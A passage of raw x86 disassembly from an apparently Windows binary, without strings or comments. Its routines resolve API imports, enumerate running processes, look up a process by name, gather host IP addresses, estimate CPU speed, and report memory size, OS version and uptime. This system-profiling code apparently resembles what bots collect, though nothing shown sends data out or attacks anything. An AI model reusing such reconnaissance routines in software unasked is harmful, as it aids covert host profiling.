1314522d:	68 e8 ff 14 13       	push   $0x1314ffe8
13145232:	53                   	push   %ebx
13145233:	a3 08 37 15 13       	mov    %eax,0x13153708
13145238:	ff d6                	call   *%esi
1314523a:	68 d8 ff 14 13       	push   $0x1314ffd8
1314523f:	53                   	push   %ebx
13145240:	a3 b4 39 15 13       	mov    %eax,0x131539b4
13145245:	ff d6                	call   *%esi
13145247:	68 c8 ff 14 13       	push   $0x1314ffc8
1314524c:	55                   	push   %ebp
1314524d:	a3 38 37 15 13       	mov    %eax,0x13153738
13145252:	ff d6                	call   *%esi
13145254:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
13145258:	68 b8 ff 14 13       	push   $0x1314ffb8
1314525d:	53                   	push   %ebx
1314525e:	a3 08 34 15 13       	mov    %eax,0x13153408
13145263:	ff d6                	call   *%esi
13145265:	68 a4 ff 14 13       	push   $0x1314ffa4
1314526a:	53                   	push   %ebx
1314526b:	a3 94 39 15 13       	mov    %eax,0x13153994
13145270:	ff d6                	call   *%esi
13145272:	68 90 ff 14 13       	push   $0x1314ff90
13145277:	53                   	push   %ebx
13145278:	a3 3c 35 15 13       	mov    %eax,0x1315353c
1314527d:	ff d6                	call   *%esi
1314527f:	68 7c ff 14 13       	push   $0x1314ff7c
13145284:	53                   	push   %ebx
13145285:	a3 c0 36 15 13       	mov    %eax,0x131536c0
1314528a:	ff d6                	call   *%esi
1314528c:	68 68 ff 14 13       	push   $0x1314ff68
13145291:	53                   	push   %ebx
13145292:	a3 dc 33 15 13       	mov    %eax,0x131533dc
13145297:	ff d6                	call   *%esi
13145299:	68 54 ff 14 13       	push   $0x1314ff54
1314529e:	53                   	push   %ebx
1314529f:	a3 80 36 15 13       	mov    %eax,0x13153680
131452a4:	ff d6                	call   *%esi
131452a6:	a3 70 37 15 13       	mov    %eax,0x13153770
131452ab:	68 44 ff 14 13       	push   $0x1314ff44
131452b0:	55                   	push   %ebp
131452b1:	ff d6                	call   *%esi
131452b3:	68 34 ff 14 13       	push   $0x1314ff34
131452b8:	57                   	push   %edi
131452b9:	a3 04 34 15 13       	mov    %eax,0x13153404
131452be:	ff d6                	call   *%esi
131452c0:	68 24 ff 14 13       	push   $0x1314ff24
131452c5:	55                   	push   %ebp
131452c6:	a3 6c 37 15 13       	mov    %eax,0x1315376c
131452cb:	ff d6                	call   *%esi
131452cd:	68 14 ff 14 13       	push   $0x1314ff14
131452d2:	55                   	push   %ebp
131452d3:	a3 a0 39 15 13       	mov    %eax,0x131539a0
131452d8:	ff d6                	call   *%esi
131452da:	68 04 ff 14 13       	push   $0x1314ff04
131452df:	55                   	push   %ebp
131452e0:	a3 20 34 15 13       	mov    %eax,0x13153420
131452e5:	ff d6                	call   *%esi
131452e7:	68 f0 fe 14 13       	push   $0x1314fef0
131452ec:	55                   	push   %ebp
131452ed:	a3 10 37 15 13       	mov    %eax,0x13153710
131452f2:	ff d6                	call   *%esi
131452f4:	68 e0 fe 14 13       	push   $0x1314fee0
131452f9:	55                   	push   %ebp
131452fa:	a3 14 37 15 13       	mov    %eax,0x13153714
131452ff:	ff d6                	call   *%esi
13145301:	68 d0 fe 14 13       	push   $0x1314fed0
13145306:	55                   	push   %ebp
13145307:	a3 b0 39 15 13       	mov    %eax,0x131539b0
1314530c:	ff d6                	call   *%esi
1314530e:	68 c0 fe 14 13       	push   $0x1314fec0
13145313:	55                   	push   %ebp
13145314:	a3 d0 36 15 13       	mov    %eax,0x131536d0
13145319:	ff d6                	call   *%esi
1314531b:	68 b4 fe 14 13       	push   $0x1314feb4
13145320:	a3 2c 35 15 13       	mov    %eax,0x1315352c
13145325:	ff 74 24 18          	pushl  0x18(%esp)
13145329:	ff d6                	call   *%esi
1314532b:	68 a0 fe 14 13       	push   $0x1314fea0
13145330:	57                   	push   %edi
13145331:	a3 98 39 15 13       	mov    %eax,0x13153998
13145336:	ff d6                	call   *%esi
13145338:	68 88 fe 14 13       	push   $0x1314fe88
1314533d:	57                   	push   %edi
1314533e:	a3 d8 33 15 13       	mov    %eax,0x131533d8
13145343:	ff d6                	call   *%esi
13145345:	68 70 fe 14 13       	push   $0x1314fe70
1314534a:	57                   	push   %edi
1314534b:	a3 94 33 15 13       	mov    %eax,0x13153394
13145350:	ff d6                	call   *%esi
13145352:	68 60 fe 14 13       	push   $0x1314fe60
13145357:	57                   	push   %edi
13145358:	a3 a4 33 15 13       	mov    %eax,0x131533a4
1314535d:	ff d6                	call   *%esi
1314535f:	68 48 fe 14 13       	push   $0x1314fe48
13145364:	55                   	push   %ebp
13145365:	a3 e8 33 15 13       	mov    %eax,0x131533e8
1314536a:	ff d6                	call   *%esi
1314536c:	68 30 fe 14 13       	push   $0x1314fe30
13145371:	55                   	push   %ebp
13145372:	a3 c4 33 15 13       	mov    %eax,0x131533c4
13145377:	ff d6                	call   *%esi
13145379:	68 1c fe 14 13       	push   $0x1314fe1c
1314537e:	55                   	push   %ebp
1314537f:	a3 ec 33 15 13       	mov    %eax,0x131533ec
13145384:	ff d6                	call   *%esi
13145386:	68 10 fe 14 13       	push   $0x1314fe10
1314538b:	57                   	push   %edi
1314538c:	a3 18 34 15 13       	mov    %eax,0x13153418
13145391:	ff d6                	call   *%esi
13145393:	68 00 fe 14 13       	push   $0x1314fe00
13145398:	55                   	push   %ebp
13145399:	a3 f4 33 15 13       	mov    %eax,0x131533f4
1314539e:	ff d6                	call   *%esi
131453a0:	68 c0 fd 14 13       	push   $0x1314fdc0
131453a5:	68 5c 23 15 13       	push   $0x1315235c
131453aa:	a3 c0 33 15 13       	mov    %eax,0x131533c0
131453af:	e8 25 0a 00 00       	call   0x13145dd9
131453b4:	68 88 fd 14 13       	push   $0x1314fd88
131453b9:	68 b8 23 15 13       	push   $0x131523b8
131453be:	e8 16 0a 00 00       	call   0x13145dd9
131453c3:	68 78 fd 14 13       	push   $0x1314fd78
131453c8:	68 a4 23 15 13       	push   $0x131523a4
131453cd:	e8 07 0a 00 00       	call   0x13145dd9
131453d2:	68 70 fd 14 13       	push   $0x1314fd70
131453d7:	68 f4 23 15 13       	push   $0x131523f4
131453dc:	e8 f8 09 00 00       	call   0x13145dd9
131453e1:	68 48 fd 14 13       	push   $0x1314fd48
131453e6:	68 58 68 17 13       	push   $0x13176858
131453eb:	e8 e9 09 00 00       	call   0x13145dd9
131453f0:	83 c4 28             	add    $0x28,%esp
131453f3:	6a 01                	push   $0x1
131453f5:	58                   	pop    %eax
131453f6:	5f                   	pop    %edi
131453f7:	5e                   	pop    %esi
131453f8:	5d                   	pop    %ebp
131453f9:	5b                   	pop    %ebx
131453fa:	83 c4 10             	add    $0x10,%esp
131453fd:	c3                   	ret    
131453fe:	ff 74 24 04          	pushl  0x4(%esp)
13145402:	6a 08                	push   $0x8
13145404:	ff 15 f0 33 15 13    	call   *0x131533f0
1314540a:	50                   	push   %eax
1314540b:	ff 15 88 33 15 13    	call   *0x13153388
13145411:	c3                   	ret    
13145412:	ff 74 24 04          	pushl  0x4(%esp)
13145416:	6a 00                	push   $0x0
13145418:	ff 15 f0 33 15 13    	call   *0x131533f0
1314541e:	50                   	push   %eax
1314541f:	ff 15 d4 33 15 13    	call   *0x131533d4
13145425:	c3                   	ret    
13145426:	55                   	push   %ebp
13145427:	8b ec                	mov    %esp,%ebp
13145429:	ff 75 08             	pushl  0x8(%ebp)
1314542c:	ff 15 d0 33 15 13    	call   *0x131533d0
13145432:	85 c0                	test   %eax,%eax
13145434:	75 02                	jne    0x13145438
13145436:	5d                   	pop    %ebp
13145437:	c3                   	ret    
13145438:	0f bf 48 0a          	movswl 0xa(%eax),%ecx
1314543c:	8b 40 0c             	mov    0xc(%eax),%eax
1314543f:	51                   	push   %ecx
13145440:	ff 30                	pushl  (%eax)
13145442:	8d 45 08             	lea    0x8(%ebp),%eax
13145445:	50                   	push   %eax
13145446:	e8 05 d3 ff ff       	call   0x13142750
1314544b:	83 c4 0c             	add    $0xc,%esp
1314544e:	ff 75 08             	pushl  0x8(%ebp)
13145451:	ff 15 98 33 15 13    	call   *0x13153398
13145457:	5d                   	pop    %ebp
13145458:	c3                   	ret    
13145459:	56                   	push   %esi
1314545a:	8b 74 24 08          	mov    0x8(%esp),%esi
1314545e:	85 f6                	test   %esi,%esi
13145460:	75 05                	jne    0x13145467
13145462:	83 c8 ff             	or     $0xffffffff,%eax
13145465:	5e                   	pop    %esi
13145466:	c3                   	ret    
13145467:	6a 0d                	push   $0xd
13145469:	56                   	push   %esi
1314546a:	e8 00 d2 ff ff       	call   0x1314266f
1314546f:	59                   	pop    %ecx
13145470:	85 c0                	test   %eax,%eax
13145472:	59                   	pop    %ecx
13145473:	74 17                	je     0x1314548c
13145475:	6a 01                	push   $0x1
13145477:	6a 00                	push   $0x0
13145479:	6a 0d                	push   $0xd
1314547b:	56                   	push   %esi
1314547c:	e8 ee d1 ff ff       	call   0x1314266f
13145481:	59                   	pop    %ecx
13145482:	59                   	pop    %ecx
13145483:	50                   	push   %eax
13145484:	e8 99 d1 ff ff       	call   0x13142622
13145489:	83 c4 0c             	add    $0xc,%esp
1314548c:	6a 0a                	push   $0xa
1314548e:	56                   	push   %esi
1314548f:	e8 db d1 ff ff       	call   0x1314266f
13145494:	59                   	pop    %ecx
13145495:	85 c0                	test   %eax,%eax
13145497:	59                   	pop    %ecx
13145498:	74 17                	je     0x131454b1
1314549a:	6a 01                	push   $0x1
1314549c:	6a 00                	push   $0x0
1314549e:	6a 0a                	push   $0xa
131454a0:	56                   	push   %esi
131454a1:	e8 c9 d1 ff ff       	call   0x1314266f
131454a6:	59                   	pop    %ecx
131454a7:	59                   	pop    %ecx
131454a8:	50                   	push   %eax
131454a9:	e8 74 d1 ff ff       	call   0x13142622
131454ae:	83 c4 0c             	add    $0xc,%esp
131454b1:	33 c0                	xor    %eax,%eax
131454b3:	5e                   	pop    %esi
131454b4:	c3                   	ret    
131454b5:	55                   	push   %ebp
131454b6:	8b ec                	mov    %esp,%ebp
131454b8:	53                   	push   %ebx
131454b9:	56                   	push   %esi
131454ba:	8b 75 08             	mov    0x8(%ebp),%esi
131454bd:	57                   	push   %edi
131454be:	33 ff                	xor    %edi,%edi
131454c0:	3b f7                	cmp    %edi,%esi
131454c2:	0f 84 a3 00 00 00    	je     0x1314556b
131454c8:	8b 5d 0c             	mov    0xc(%ebp),%ebx
131454cb:	3b df                	cmp    %edi,%ebx
131454cd:	0f 84 98 00 00 00    	je     0x1314556b
131454d3:	39 7d 10             	cmp    %edi,0x10(%ebp)
131454d6:	75 1c                	jne    0x131454f4
131454d8:	8d 45 14             	lea    0x14(%ebp),%eax
131454db:	50                   	push   %eax
131454dc:	56                   	push   %esi
131454dd:	e8 5b d1 ff ff       	call   0x1314263d
131454e2:	59                   	pop    %ecx
131454e3:	85 c0                	test   %eax,%eax
131454e5:	59                   	pop    %ecx
131454e6:	74 6d                	je     0x13145555
131454e8:	8d 45 14             	lea    0x14(%ebp),%eax
131454eb:	50                   	push   %eax
131454ec:	56                   	push   %esi
131454ed:	e8 4b d1 ff ff       	call   0x1314263d
131454f2:	eb 52                	jmp    0x13145546
131454f4:	7e 23                	jle    0x13145519
131454f6:	ff 75 14             	pushl  0x14(%ebp)
131454f9:	56                   	push   %esi
131454fa:	e8 70 d1 ff ff       	call   0x1314266f
131454ff:	59                   	pop    %ecx
13145500:	85 c0                	test   %eax,%eax
13145502:	59                   	pop    %ecx
13145503:	74 66                	je     0x1314556b
13145505:	ff 75 14             	pushl  0x14(%ebp)
13145508:	56                   	push   %esi
13145509:	e8 61 d1 ff ff       	call   0x1314266f
1314550e:	40                   	inc    %eax
1314550f:	47                   	inc    %edi
13145510:	3b 7d 10             	cmp    0x10(%ebp),%edi
13145513:	59                   	pop    %ecx
13145514:	59                   	pop    %ecx
13145515:	8b f0                	mov    %eax,%esi
13145517:	7c dd                	jl     0x131454f6
13145519:	68 80 00 00 00       	push   $0x80
1314551e:	6a 00                	push   $0x0
13145520:	53                   	push   %ebx
13145521:	e8 fc d0 ff ff       	call   0x13142622
13145526:	8d 45 14             	lea    0x14(%ebp),%eax
13145529:	50                   	push   %eax
1314552a:	56                   	push   %esi
1314552b:	e8 0d d1 ff ff       	call   0x1314263d
13145530:	83 c4 14             	add    $0x14,%esp
13145533:	85 c0                	test   %eax,%eax
13145535:	74 1e                	je     0x13145555
13145537:	80 7d 18 00          	cmpb   $0x0,0x18(%ebp)
1314553b:	75 18                	jne    0x13145555
1314553d:	ff 75 14             	pushl  0x14(%ebp)
13145540:	56                   	push   %esi
13145541:	e8 29 d1 ff ff       	call   0x1314266f
13145546:	2b c6                	sub    %esi,%eax
13145548:	50                   	push   %eax
13145549:	56                   	push   %esi
1314554a:	53                   	push   %ebx
1314554b:	e8 00 d2 ff ff       	call   0x13142750
13145550:	83 c4 14             	add    $0x14,%esp
13145553:	eb 11                	jmp    0x13145566
13145555:	56                   	push   %esi
13145556:	e8 a2 d1 ff ff       	call   0x131426fd
1314555b:	50                   	push   %eax
1314555c:	56                   	push   %esi
1314555d:	53                   	push   %ebx
1314555e:	e8 ed d1 ff ff       	call   0x13142750
13145563:	83 c4 10             	add    $0x10,%esp
13145566:	6a 01                	push   $0x1
13145568:	58                   	pop    %eax
13145569:	eb 02                	jmp    0x1314556d
1314556b:	33 c0                	xor    %eax,%eax
1314556d:	5f                   	pop    %edi
1314556e:	5e                   	pop    %esi
1314556f:	5b                   	pop    %ebx
13145570:	5d                   	pop    %ebp
13145571:	c3                   	ret    
13145572:	6a 00                	push   $0x0
13145574:	6a 20                	push   $0x20
13145576:	ff 74 24 14          	pushl  0x14(%esp)
1314557a:	ff 74 24 14          	pushl  0x14(%esp)
1314557e:	ff 74 24 14          	pushl  0x14(%esp)
13145582:	e8 2e ff ff ff       	call   0x131454b5
13145587:	83 c4 14             	add    $0x14,%esp
1314558a:	c3                   	ret    
1314558b:	55                   	push   %ebp
1314558c:	8b ec                	mov    %esp,%ebp
1314558e:	51                   	push   %ecx
1314558f:	51                   	push   %ecx
13145590:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
13145594:	53                   	push   %ebx
13145595:	56                   	push   %esi
13145596:	bb 00 01 00 00       	mov    $0x100,%ebx
1314559b:	57                   	push   %edi
1314559c:	be 2c 34 15 13       	mov    $0x1315342c,%esi
131455a1:	53                   	push   %ebx
131455a2:	56                   	push   %esi
131455a3:	ff 15 7c 36 15 13    	call   *0x1315367c
131455a9:	85 c0                	test   %eax,%eax
131455ab:	75 0b                	jne    0x131455b8
131455ad:	56                   	push   %esi
131455ae:	ff 15 d0 33 15 13    	call   *0x131533d0
131455b4:	8b f8                	mov    %eax,%edi
131455b6:	eb 03                	jmp    0x131455bb
131455b8:	8b 7d f8             	mov    -0x8(%ebp),%edi
131455bb:	53                   	push   %ebx
131455bc:	6a 00                	push   $0x0
131455be:	56                   	push   %esi
131455bf:	e8 5e d0 ff ff       	call   0x13142622
131455c4:	8b 47 0c             	mov    0xc(%edi),%eax
131455c7:	83 c4 0c             	add    $0xc,%esp
131455ca:	8b 00                	mov    (%eax),%eax
131455cc:	85 c0                	test   %eax,%eax
131455ce:	74 46                	je     0x13145616
131455d0:	0f bf 4f 0a          	movswl 0xa(%edi),%ecx
131455d4:	51                   	push   %ecx
131455d5:	50                   	push   %eax
131455d6:	8d 45 f8             	lea    -0x8(%ebp),%eax
131455d9:	50                   	push   %eax
131455da:	e8 71 d1 ff ff       	call   0x13142750
131455df:	83 c4 0c             	add    $0xc,%esp
131455e2:	ff 75 f8             	pushl  -0x8(%ebp)
131455e5:	ff 15 98 33 15 13    	call   *0x13153398
131455eb:	50                   	push   %eax
131455ec:	68 9c 06 15 13       	push   $0x1315069c
131455f1:	56                   	push   %esi
131455f2:	e8 06 d1 ff ff       	call   0x131426fd
131455f7:	0f af 45 fc          	imul   -0x4(%ebp),%eax
131455fb:	59                   	pop    %ecx
131455fc:	03 c6                	add    %esi,%eax
131455fe:	50                   	push   %eax
131455ff:	ff 15 98 39 15 13    	call   *0x13153998
13145605:	8b 47 0c             	mov    0xc(%edi),%eax
13145608:	83 c4 0c             	add    $0xc,%esp
1314560b:	ff 45 fc             	incl   -0x4(%ebp)
1314560e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
13145611:	8b 04 88             	mov    (%eax,%ecx,4),%eax
13145614:	eb b6                	jmp    0x131455cc
13145616:	56                   	push   %esi
13145617:	e8 e1 d0 ff ff       	call   0x131426fd
1314561c:	80 a0 2b 34 15 13 00 	andb   $0x0,0x1315342b(%eax)
13145623:	59                   	pop    %ecx
13145624:	8b c6                	mov    %esi,%eax
13145626:	5f                   	pop    %edi
13145627:	5e                   	pop    %esi
13145628:	5b                   	pop    %ebx
13145629:	c9                   	leave  
1314562a:	c3                   	ret    
1314562b:	55                   	push   %ebp
1314562c:	8b ec                	mov    %esp,%ebp
1314562e:	81 ec 28 01 00 00    	sub    $0x128,%esp
13145634:	56                   	push   %esi
13145635:	57                   	push   %edi
13145636:	6a 49                	push   $0x49
13145638:	33 c0                	xor    %eax,%eax
1314563a:	59                   	pop    %ecx
1314563b:	8d bd dc fe ff ff    	lea    -0x124(%ebp),%edi
13145641:	c7 85 d8 fe ff ff 28 	movl   $0x128,-0x128(%ebp)
13145648:	01 00 00 
1314564b:	50                   	push   %eax
1314564c:	f3 ab                	rep stos %eax,%es:(%edi)
1314564e:	6a 02                	push   $0x2
13145650:	ff 15 9c 39 15 13    	call   *0x1315399c
13145656:	8b f0                	mov    %eax,%esi
13145658:	83 fe ff             	cmp    $0xffffffff,%esi
1314565b:	74 3f                	je     0x1314569c
1314565d:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
13145663:	50                   	push   %eax
13145664:	56                   	push   %esi
13145665:	ff 15 78 36 15 13    	call   *0x13153678
1314566b:	85 c0                	test   %eax,%eax
1314566d:	74 2d                	je     0x1314569c
1314566f:	ff 75 08             	pushl  0x8(%ebp)
13145672:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
13145678:	50                   	push   %eax
13145679:	e8 ae d0 ff ff       	call   0x1314272c
1314567e:	59                   	pop    %ecx
1314567f:	85 c0                	test   %eax,%eax
13145681:	59                   	pop    %ecx
13145682:	74 10                	je     0x13145694
13145684:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
1314568a:	50                   	push   %eax
1314568b:	56                   	push   %esi
1314568c:	ff 15 e0 36 15 13    	call   *0x131536e0
13145692:	eb d7                	jmp    0x1314566b
13145694:	8b 85 e0 fe ff ff    	mov    -0x120(%ebp),%eax
1314569a:	eb 02                	jmp    0x1314569e
1314569c:	33 c0                	xor    %eax,%eax
1314569e:	5f                   	pop    %edi
1314569f:	5e                   	pop    %esi
131456a0:	c9                   	leave  
131456a1:	c3                   	ret    
131456a2:	55                   	push   %ebp
131456a3:	8b ec                	mov    %esp,%ebp
131456a5:	81 ec 28 01 00 00    	sub    $0x128,%esp
131456ab:	56                   	push   %esi
131456ac:	57                   	push   %edi
131456ad:	6a 49                	push   $0x49
131456af:	33 c0                	xor    %eax,%eax
131456b1:	59                   	pop    %ecx
131456b2:	8d bd dc fe ff ff    	lea    -0x124(%ebp),%edi
131456b8:	68 00 02 00 00       	push   $0x200
131456bd:	be 90 37 15 13       	mov    $0x13153790,%esi
131456c2:	c7 85 d8 fe ff ff 28 	movl   $0x128,-0x128(%ebp)
131456c9:	01 00 00 
131456cc:	50                   	push   %eax
131456cd:	f3 ab                	rep stos %eax,%es:(%edi)
131456cf:	56                   	push   %esi
131456d0:	e8 4d cf ff ff       	call   0x13142622
131456d5:	83 c4 0c             	add    $0xc,%esp
131456d8:	6a 00                	push   $0x0
131456da:	6a 02                	push   $0x2
131456dc:	ff 15 9c 39 15 13    	call   *0x1315399c
131456e2:	8b f8                	mov    %eax,%edi
131456e4:	83 ff ff             	cmp    $0xffffffff,%edi
131456e7:	75 07                	jne    0x131456f0
131456e9:	33 c0                	xor    %eax,%eax
131456eb:	e9 b5 00 00 00       	jmp    0x131457a5
131456f0:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
131456f6:	50                   	push   %eax
131456f7:	57                   	push   %edi
131456f8:	ff 15 e0 36 15 13    	call   *0x131536e0
131456fe:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
13145704:	50                   	push   %eax
13145705:	57                   	push   %edi
13145706:	ff 15 e0 36 15 13    	call   *0x131536e0
1314570c:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
13145712:	85 c0                	test   %eax,%eax
13145714:	74 69                	je     0x1314577f
13145716:	ff 75 08             	pushl  0x8(%ebp)
13145719:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
1314571f:	50                   	push   %eax
13145720:	e8 07 d0 ff ff       	call   0x1314272c
13145725:	59                   	pop    %ecx
13145726:	85 c0                	test   %eax,%eax
13145728:	59                   	pop    %ecx
13145729:	75 35                	jne    0x13145760
1314572b:	ff 75 0c             	pushl  0xc(%ebp)
1314572e:	e8 cb 34 00 00       	call   0x13148bfe
13145733:	59                   	pop    %ecx
13145734:	50                   	push   %eax
13145735:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
1314573b:	50                   	push   %eax
1314573c:	ff 75 0c             	pushl  0xc(%ebp)
1314573f:	e8 9f 34 00 00       	call   0x13148be3
13145744:	59                   	pop    %ecx
13145745:	50                   	push   %eax
13145746:	68 a0 06 15 13       	push   $0x131506a0
1314574b:	56                   	push   %esi
1314574c:	e8 ac cf ff ff       	call   0x131426fd
13145751:	59                   	pop    %ecx
13145752:	03 c6                	add    %esi,%eax
13145754:	50                   	push   %eax
13145755:	ff 15 98 39 15 13    	call   *0x13153998
1314575b:	83 c4 14             	add    $0x14,%esp
1314575e:	eb 1f                	jmp    0x1314577f
13145760:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
13145766:	50                   	push   %eax
13145767:	68 9c 06 15 13       	push   $0x1315069c
1314576c:	56                   	push   %esi
1314576d:	e8 8b cf ff ff       	call   0x131426fd
13145772:	59                   	pop    %ecx
13145773:	03 c6                	add    %esi,%eax
13145775:	50                   	push   %eax
13145776:	ff 15 98 39 15 13    	call   *0x13153998
1314577c:	83 c4 0c             	add    $0xc,%esp
1314577f:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
13145785:	50                   	push   %eax
13145786:	57                   	push   %edi
13145787:	ff 15 e0 36 15 13    	call   *0x131536e0
1314578d:	85 c0                	test   %eax,%eax
1314578f:	0f 85 77 ff ff ff    	jne    0x1314570c
13145795:	56                   	push   %esi
13145796:	e8 62 cf ff ff       	call   0x131426fd
1314579b:	80 a0 8f 37 15 13 00 	andb   $0x0,0x1315378f(%eax)
131457a2:	59                   	pop    %ecx
131457a3:	8b c6                	mov    %esi,%eax
131457a5:	5f                   	pop    %edi
131457a6:	5e                   	pop    %esi
131457a7:	c9                   	leave  
131457a8:	c3                   	ret    
131457a9:	0f 31                	rdtsc  
131457ab:	c3                   	ret    
131457ac:	56                   	push   %esi
131457ad:	57                   	push   %edi
131457ae:	be 40 42 0f 00       	mov    $0xf4240,%esi
131457b3:	e8 f1 ff ff ff       	call   0x131457a9
131457b8:	68 e8 03 00 00       	push   $0x3e8
131457bd:	8b f8                	mov    %eax,%edi
131457bf:	ff 15 fc 36 15 13    	call   *0x131536fc
131457c5:	e8 df ff ff ff       	call   0x131457a9
131457ca:	2b c7                	sub    %edi,%eax
131457cc:	33 d2                	xor    %edx,%edx
131457ce:	8b ce                	mov    %esi,%ecx
131457d0:	f7 f1                	div    %ecx
131457d2:	8b c8                	mov    %eax,%ecx
131457d4:	3b ce                	cmp    %esi,%ecx
131457d6:	77 db                	ja     0x131457b3
131457d8:	6a 64                	push   $0x64
131457da:	33 d2                	xor    %edx,%edx
131457dc:	5e                   	pop    %esi
131457dd:	f7 f6                	div    %esi
131457df:	56                   	push   %esi
131457e0:	58                   	pop    %eax
131457e1:	5f                   	pop    %edi
131457e2:	5e                   	pop    %esi
131457e3:	83 fa 50             	cmp    $0x50,%edx
131457e6:	73 03                	jae    0x131457eb
131457e8:	6a 4b                	push   $0x4b
131457ea:	58                   	pop    %eax
131457eb:	83 fa 47             	cmp    $0x47,%edx
131457ee:	73 03                	jae    0x131457f3
131457f0:	6a 42                	push   $0x42
131457f2:	58                   	pop    %eax
131457f3:	83 fa 37             	cmp    $0x37,%edx
131457f6:	73 03                	jae    0x131457fb
131457f8:	6a 32                	push   $0x32
131457fa:	58                   	pop    %eax
131457fb:	83 fa 26             	cmp    $0x26,%edx
131457fe:	73 03                	jae    0x13145803
13145800:	6a 21                	push   $0x21
13145802:	58                   	pop    %eax
13145803:	83 fa 1e             	cmp    $0x1e,%edx
13145806:	73 03                	jae    0x1314580b
13145808:	6a 19                	push   $0x19
1314580a:	58                   	pop    %eax
1314580b:	83 fa 0a             	cmp    $0xa,%edx
1314580e:	73 02                	jae    0x13145812
13145810:	33 c0                	xor    %eax,%eax
13145812:	2b c2                	sub    %edx,%eax
13145814:	03 c1                	add    %ecx,%eax
13145816:	c3                   	ret    
13145817:	55                   	push   %ebp
13145818:	8b ec                	mov    %esp,%ebp
1314581a:	83 ec 20             	sub    $0x20,%esp
1314581d:	8d 45 e0             	lea    -0x20(%ebp),%eax
13145820:	50                   	push   %eax
13145821:	ff 15 bc 33 15 13    	call   *0x131533bc
13145827:	8b 45 e8             	mov    -0x18(%ebp),%eax
1314582a:	c1 e8 14             	shr    $0x14,%eax
1314582d:	c9                   	leave  
1314582e:	c3                   	ret    
1314582f:	55                   	push   %ebp
13145830:	8b ec                	mov    %esp,%ebp
13145832:	81 ec 94 00 00 00    	sub    $0x94,%esp
13145838:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
1314583e:	c7 85 6c ff ff ff 94 	movl   $0x94,-0x94(%ebp)
13145845:	00 00 00 
13145848:	50                   	push   %eax
13145849:	ff 15 e8 36 15 13    	call   *0x131536e8
1314584f:	83 bd 70 ff ff ff 04 	cmpl   $0x4,-0x90(%ebp)
13145856:	75 54                	jne    0x131458ac
13145858:	83 bd 74 ff ff ff 00 	cmpl   $0x0,-0x8c(%ebp)
1314585f:	75 2b                	jne    0x1314588c
13145861:	83 bd 7c ff ff ff 01 	cmpl   $0x1,-0x84(%ebp)
13145868:	75 12                	jne    0x1314587c
1314586a:	68 e0 06 15 13       	push   $0x131506e0
1314586f:	68 1c 37 15 13       	push   $0x1315371c
13145874:	ff 15 98 39 15 13    	call   *0x13153998
1314587a:	59                   	pop    %ecx
1314587b:	59                   	pop    %ecx
1314587c:	83 bd 7c ff ff ff 02 	cmpl   $0x2,-0x84(%ebp)
13145883:	75 72                	jne    0x131458f7
13145885:	68 d8 06 15 13       	push   $0x131506d8
1314588a:	eb 5e                	jmp    0x131458ea
1314588c:	83 bd 74 ff ff ff 0a 	cmpl   $0xa,-0x8c(%ebp)
13145893:	75 07                	jne    0x1314589c
13145895:	68 d0 06 15 13       	push   $0x131506d0
1314589a:	eb 4e                	jmp    0x131458ea
1314589c:	83 bd 74 ff ff ff 5a 	cmpl   $0x5a,-0x8c(%ebp)
131458a3:	75 40                	jne    0x131458e5
131458a5:	68 c8 06 15 13       	push   $0x131506c8
131458aa:	eb 3e                	jmp    0x131458ea
131458ac:	83 bd 70 ff ff ff 05 	cmpl   $0x5,-0x90(%ebp)
131458b3:	75 30                	jne    0x131458e5
131458b5:	83 bd 74 ff ff ff 00 	cmpl   $0x0,-0x8c(%ebp)
131458bc:	75 07                	jne    0x131458c5
131458be:	68 c0 06 15 13       	push   $0x131506c0
131458c3:	eb 25                	jmp    0x131458ea
131458c5:	83 bd 74 ff ff ff 01 	cmpl   $0x1,-0x8c(%ebp)
131458cc:	75 07                	jne    0x131458d5
131458ce:	68 b8 06 15 13       	push   $0x131506b8
131458d3:	eb 15                	jmp    0x131458ea
131458d5:	83 bd 74 ff ff ff 02 	cmpl   $0x2,-0x8c(%ebp)
131458dc:	75 07                	jne    0x131458e5
131458de:	68 b0 06 15 13       	push   $0x131506b0
131458e3:	eb 05                	jmp    0x131458ea
131458e5:	68 a8 06 15 13       	push   $0x131506a8
131458ea:	68 1c 37 15 13       	push   $0x1315371c
131458ef:	ff 15 98 39 15 13    	call   *0x13153998
131458f5:	59                   	pop    %ecx
131458f6:	59                   	pop    %ecx
131458f7:	b8 1c 37 15 13       	mov    $0x1315371c,%eax
131458fc:	c9                   	leave  
131458fd:	c3                   	ret    
131458fe:	53                   	push   %ebx
131458ff:	55                   	push   %ebp
13145900:	56                   	push   %esi
13145901:	57                   	push   %edi
13145902:	ff 15 28 34 15 13    	call   *0x13153428
13145908:	33 d2                	xor    %edx,%edx
1314590a:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
1314590f:	f7 f1                	div    %ecx
13145911:	bb 80 51 01 00       	mov    $0x15180,%ebx
13145916:	33 d2                	xor    %edx,%edx
13145918:	8b f3                	mov    %ebx,%esi
1314591a:	bf 10 0e 00 00       	mov    $0xe10,%edi
1314591f:	8b ef                	mov    %edi,%ebp
13145921:	6a 3c                	push   $0x3c
13145923:	8b c8                	mov    %eax,%ecx
13145925:	2b 4c 24 18          	sub    0x18(%esp),%ecx
13145929:	8b c1                	mov    %ecx,%eax
1314592b:	f7 f6                	div    %esi
1314592d:	8b f2                	mov    %edx,%esi
1314592f:	33 d2                	xor    %edx,%edx
13145931:	8b c6                	mov    %esi,%eax
13145933:	f7 f5                	div    %ebp
13145935:	5d                   	pop    %ebp
13145936:	8b c2                	mov    %edx,%eax
13145938:	33 d2                	xor    %edx,%edx
1314593a:	f7 f5                	div    %ebp
1314593c:	33 d2                	xor    %edx,%edx
1314593e:	50                   	push   %eax
1314593f:	8b c6                	mov    %esi,%eax
13145941:	f7 f7                	div    %edi
